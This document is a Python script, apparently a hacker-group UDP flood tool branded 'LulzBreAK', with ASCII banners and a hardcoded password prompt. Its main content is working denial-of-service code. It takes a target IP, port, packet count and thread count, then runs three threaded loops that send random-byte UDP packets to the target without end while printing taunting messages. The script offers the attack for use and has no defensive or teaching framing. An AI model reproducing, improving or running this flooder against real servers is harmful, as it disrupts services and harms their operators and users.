#Coded By KingBob & Xnuxer mz
import random
import socket
import threading
import time
import os,sys
import random, socket, threading
import os
import getpass

os.system("clear")
print("""\033[93m
█████                          ███               
░░███                          ░░░                
 ░███         ██████   ███████ ████  ████████     
 ░███        ███░░███ ███░░███░░███ ░░███░░███    
 ░███       ░███ ░███░███ ░███ ░███  ░███ ░███    
 ░███      █░███ ░███░███ ░███ ░███  ░███ ░███    
 ███████████░░██████ ░░███████ █████ ████ █████   
░░░░░░░░░░░  ░░░░░░   ░░░░░███░░░░░ ░░░░ ░░░░░    
                      ███ ░███                    
                     ░░██████                     
                      ░░░░░░     
             \033[93m>> \033[96mTools Subscribe Tools By LulzBreAK \033[93m<< 
            \033[97m
   ███                                                                                
  █   █
\033[97m  █   █                      \033[93m Terima kasih KingBob
\033[97m█████████               ██   \033[93m Or You Can Just Join Our Discord Server, Link??
\033[97m█████████              █  █  \033[93m LulzBreAK \033[97m
\033[97m███   ███ ██████████████  █      
\033[97m████ ████ █ █          █  █
\033[97m█████████               ██     \033[33m      
    
""") 

password ="LulzBreak"

for i in range(4):
	pwd = input("[•] Input Password : ")
	j=3
	if(pwd==password):
		time.sleep(1)
		print("[•] Check Password ")
		break
	else:
		time.sleep(2)
		print("\033[91m[×] Your Password is Wrong !!! ")
		continue
time.sleep(1)
print("Your Password is Correct!!!! \033[92m[√]\033[0m ")
time.sleep(2)
os.system("clear")


print("""\033[93m
 
 */*,,,**,****,*/***,*****/***/*/*****/*/*****//***//,,,,/***//*///***/**********
**,,***,*******/*******,*,**@@@@%               &@@@&*/********,***********/****
*********,*****,*,****@@@   * @% @/  .,@@&@@(@@ / @/.   @@&**/***/******/**/****
/*/********/*,,***@@   @@   @@ @@*             ( @# %@& @@   @@****,*******,**,*
*****/*********@@    @@@%@   ,@@@&             &@@@.   @@*@     @@,***,********/
*//*********@@   @@ @   &@@                           @@#  @  @@,  @@******/****
*****/***,@* @@ @((  @%                                   @@  @*/@.  &@/**,****/
********@/ ,@@ @  @#                                         @@    @@@ &@*/*****
,*****%@ @..    @                  ,,,,,,,,,,.                  @  /@@&  @/*****
,*,**@.   @,  @     &@@      .,  .,  ,  ,  ,  ,   ,       @@/     @  @& , #@/*//
/**,@  @@ @ @@  %@ @@ .   ,. ,,,.   ,   ,   .   ,.,, ,,   # @@ @.  @#  @@   @***
*,*@  @@ ( @. @%@  @@.  ,     ,     , @&,@@ ,     ,     ,  (@% #@ & (@ @@@@ .@*/
**@# @@*@ @. @&&&@@   ,      ,     ,    ,@/  .     ,     ..   @@@.@@ #@ @* @ @&,
*/@ %@@@ (@  @@* @@  ,   ,,,,      ,    ,    ,      ,,,,   ,  @@  @@  @   &@, @*
*@#  ,&@ @   @@@@@  ,       ,      ,    @    ,      ,          @@@@@   @ ./@@ @%
*@  #@@  @ @/ @@ @  ,      .       ,         ,      .       ,  @ @@ && @ ,*   .@
*@ *@@@  @ /@%(.@@  ,,,,,,,,,,,,,,,@@   @  ,@@,,,,,,,,,,,,,,,  @@  @@  @       @
*@  @@@  @  @@,@@   ,      . @@@@@@@@   @   @@@@@@@@.       ,   @@&@@* @ *@/, .@
*@% * @@ @ @. @@ @@ .       @@@@@@@@@  &@,  @@@@@@@@%      .  @# @@ #( @ @ #@ @#
**@      *@ @@&  @@  ,   ,,,@@@@@@@@@@ @@% @@@@@@@@@@,,,   ,  @@  @@@ @  @(   @*
//@% # @@ @*  @@@@@ @ ..   .@@@@@@@@@@@@@@@@@@@@@@@@@    , ,@ @@@@@  &@ @@   @%/
/(/@  @@/@ @* @  @@%,@% ,  @@@@@@@@@@@@@@@@@@@@@@@@@@#  , @@ @&@  @ %@    , ,@/*
*///@       &@ *@@@  @@,@ .@@@@@@@@@@@@@@@@@@@@@@@@@@@. @@@@  @@@  @/ @@(@ .@*//
/****@* @ ,(  @  . @@@@@%,@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @@@@@@   .@  /@ @ &@***/
/*/***(@   @#@  @  #@@@%#*  @@@@@@@@@@@@@@@@@@@@@@@@@  /#%@@@*  @     &. @/**/**
*/*,*//*@& .&@@@  @@  ,        @@@@@@@@@@@@@@@@@@@        .  @@  @@& @ @@////**/
*/****/((/@% &&  .@  @@   @@@@@%@@@@@@@@@@@@@@@@@&@@@@@   @@  .@%@@# @@/****/*//
//**//(///*/@@  @   .@  /@@     @@@@@@@@@@@@@@@@@     @@.   @/ @   @&**//////*//
*/***///*/****/@@  @ .@ &@.   @@@@@@@@@@@@@@@@@@@@@    @ @ @@   @@*****,*/****//
*,,///**///**///*,@@,  @@@/@@#  *               @@ @/@   ,  (@&***//********/**/
***/////*//*/**/*****/%@@   . @@  @ #@@@@ @ #@@  #@&   .@@(*/**/**////****//////
*/(*////**//////////**/,**/*#@@@@*             /@@@@/,*,******/(//*****///*/***/
                                                                                      
                        
""")

ip = str(input("  \033[0;31mIP:"))
port = int(input(" \033[0;32mPort:"))
choice = str(input(" \033[96mMethods [UDP]: "))
times = int(input(" \033[0;31mPacket:"))
threads = int(input(" \033[0;32mThreads:"))
def run():
	data = random._urandom(577)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" LulzBreak Is Attack Your Server!!!")
		except:
			print("[?] Server Down MotherFucker?")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" LulzBreak Is Attack Your Server!!!")
		except:
			print("[?] Server Down MotherFucker?")

def run3():
	data = random._urandom(1020)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" LulzBreak Is Attack Your Server!!!")
		except:
			print("[?] Server Down MotherFucker?")

for y in range(threads):
	if choice == 'UDP':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()